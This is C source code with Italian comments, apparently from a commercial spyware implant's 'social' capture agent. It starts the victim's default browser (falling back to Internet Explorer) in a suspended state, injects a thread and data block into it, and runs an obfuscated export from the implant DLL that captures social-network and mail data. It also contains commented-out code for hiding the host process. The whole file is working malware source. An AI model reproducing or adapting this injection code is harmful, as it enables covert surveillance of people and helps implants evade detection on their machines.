
// Globals
BOOL social_is_host_started = FALSE; // Indica se il processo host del thread social e' stato gia' lanciato

#define DEFAULT_MAX_MAIL_SIZE (1024*100)

typedef void (__stdcall *Social_MainLoop_t) (void);
typedef void (__stdcall *ExitProcess_T) (UINT);

typedef struct {
	HMCommonDataStruct pCommon;     // Necessario per usare HM_sCreateHookA. Definisce anche le funzioni come LoadLibrary
	char cDLLHookName[DLLNAMELEN];	// Nome della dll principal
	char cSocialMainLoop[64];          // Nome della funzione "social"
	ExitProcess_T pExitProcess;
} SocialThreadDataStruct;
SocialThreadDataStruct SocialThreadData;

// Thread remoto iniettato nel processo Social host
DWORD Social_HostThread(SocialThreadDataStruct *pDataThread)
{
	HMODULE hMainDLL;
	Social_MainLoop_t pSocial_MainLoop;
	INIT_WRAPPER(BYTE);
	__asm int 3;
	hMainDLL = pDataThread->pCommon._LoadLibrary(pDataThread->cDLLHookName);
	if (!hMainDLL)
		pDataThread->pExitProcess(0);

	pSocial_MainLoop = (Social_MainLoop_t)pDataThread->pCommon._GetProcAddress(hMainDLL, pDataThread->cSocialMainLoop);
	
	// Invoca il ciclo principale 
	if (pSocial_MainLoop)
		pSocial_MainLoop();

	// Se il ciclo principale esce per qualche errore
	// il processo host viene chiuso
	pDataThread->pExitProcess(0);
	return 0;
}
PBYTE SkipJumps(PBYTE pbCode) {
	PBYTE pbOrgCode = pbCode;
#ifdef _X86_
	//mov edi,edi: hot patch point
	if (pbCode[0] == 0x8b && pbCode[1] == 0xff)
		pbCode += 2;
	// push ebp; mov ebp, esp; pop ebp;
	// "collapsed" stackframe generated by MSVC
	if (pbCode[0] == 0x55 && pbCode[1] == 0x8b && pbCode[2] == 0xec && pbCode[3] == 0x5d)
		pbCode += 4;
#endif	
	if (pbCode[0] == 0xff && pbCode[1] == 0x25) {
#ifdef _X86_
		// on x86 we have an absolute pointer...
		PBYTE pbTarget = *(PBYTE *)&pbCode[2];
		// ... that shows us an absolute pointer.
		return SkipJumps(*(PBYTE *)pbTarget);
#elif defined _AMD64_
		// on x64 we have a 32-bit offset...
		INT32 lOffset = *(INT32 *)&pbCode[2];
		// ... that shows us an absolute pointer
		return SkipJumps(*(PBYTE*)(pbCode + 6 + lOffset));
	}
	else if (pbCode[0] == 0x48 && pbCode[1] == 0xff && pbCode[2] == 0x25) {
		// or we can have the same with a REX prefix
		INT32 lOffset = *(INT32 *)&pbCode[3];
		// ... that shows us an absolute pointer
		return SkipJumps(*(PBYTE*)(pbCode + 7 + lOffset));
#endif
	}
	else if (pbCode[0] == 0xe9) {
		// here the behavior is identical, we have...
		// ...a 32-bit offset to the destination.
		return SkipJumps(pbCode + 5 + *(INT32 *)&pbCode[1]);
	}
	else if (pbCode[0] == 0xeb) {
		// and finally an 8-bit offset to the destination
		return SkipJumps(pbCode + 2 + *(CHAR *)&pbCode[1]);
	}
	return pbOrgCode;
}
// Lancia il thread Social nel processo dwPid
BOOL Social_StartThread(DWORD dwPid, HANDLE hHostProcess)
{
	HANDLE hThreadRem;
	DWORD dwThreadId;

	BYTE * pSocial_HostThread = 0;
	pSocial_HostThread = SkipJumps((BYTE *)Social_HostThread);
	// Alloca dati e funzioni del thread Social nel processo dwPid
	if (HM_sCreateHookA(dwPid, NULL, NULL, pSocial_HostThread, 600, (BYTE *)&SocialThreadData, sizeof(SocialThreadData)) == NULL)
		return FALSE;
	
	if ( !(hThreadRem = HM_SafeCreateRemoteThread(hHostProcess, NULL, 8192, (LPTHREAD_START_ROUTINE)SocialThreadData.pCommon.dwHookAdd, (LPVOID)SocialThreadData.pCommon.dwDataAdd, 0, &dwThreadId)) )
		return FALSE;
		
	CloseHandle(hThreadRem);
	return TRUE;
}

DWORD SocialHost_Setup()
{
	HMODULE hMod;

	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"));

	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
	VALIDPTR(SocialThreadData.pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"));
	VALIDPTR(SocialThreadData.pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"));
	VALIDPTR(SocialThreadData.pExitProcess = (ExitProcess_T) HM_SafeGetProcAddress(hMod, "ExitProcess"));

	HM_CompletePath(H4DLLNAME, SocialThreadData.cDLLHookName);
	_snprintf_s(SocialThreadData.cSocialMainLoop, sizeof(SocialThreadData.cSocialMainLoop), _TRUNCATE, "PPPFTBBP12");

	return 0;
}


BOOL StartSocialHost(char *process_name)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE Social_HostProcess;
// 	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;

	if (SocialHost_Setup() != 0)
		return FALSE;

	// Lancia il process host con il main thread stoppato
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	HM_CreateProcess(process_name, CREATE_SUSPENDED, &si, &pi, 0);
	// Se HM_CreateProcess fallisce, pi.dwProcessId e' settato a 0
	if (!pi.dwProcessId)
		return FALSE;

	Social_HostProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
	if (Social_HostProcess == NULL) {
		SAFE_TERMINATEPROCESS(Social_HostProcess);
		return FALSE;
	}

	// Se e' a 64 bit ci risparmiamo i passi successivi e chiudiamo subito...
	if (IsX64Process(pi.dwProcessId)){
		SAFE_TERMINATEPROCESS(Social_HostProcess);
		return FALSE;
	}

// 	SET_PID_HIDE_STRUCT(pid_hide, pi.dwProcessId);
// 	AM_AddHide(HIDE_PID, &pid_hide);
	Sleep(3000);

	// Lancia il thread che eseguira' il main loop 
	if (!Social_StartThread(pi.dwProcessId, Social_HostProcess)) {
		SAFE_TERMINATEPROCESS(Social_HostProcess);
		return FALSE;
	}

	return TRUE;
}

// XXX Per disabilitare questo agente basta commentare il contenuto di questa funzione
void StartSocialCapture()
{
	char social_host[DLLNAMELEN+2]; // Il nome del processo avra' le ""

	// Solo la prima volta che viene startato uno degli agenti coinvolti il processo parte
	// Poi rimarra' sempre attivo fino all'uninstall. Al processo stesso il compito
	// di non catturare log per i moduli non attivi
	if (social_is_host_started)
		return;

	// Prova con il browser di default
	HM_GetDefaultBrowser(social_host);
	if (!StartSocialHost(social_host)) {
		// Se per qualche motivo non riesce a iniettarsi nel default browser, prova con IE32
		HM_GetIE32Browser(social_host);
		if (!StartSocialHost(social_host))
			return;
	}
	social_is_host_started = TRUE;
}

DWORD __stdcall PM_SocialAgentStartStop(BOOL bStartFlag, BOOL bReset)
{	
	return 1;
}

DWORD __stdcall PM_SocialAgentUnregister()
{
	return 1;
}

DWORD __stdcall PM_SocialAgentInit(JSONObject elem)
{
	return 1;
}

void PM_SocialAgentRegister()
{
	max_social_mail_len = DEFAULT_MAX_MAIL_SIZE*1024;
	//AM_MonitorRegister(L"social", PM_SOCIALAGENT, NULL, (BYTE *)PM_SocialAgentStartStop, (BYTE *)PM_SocialAgentInit, (BYTE *)PM_SocialAgentUnregister);
}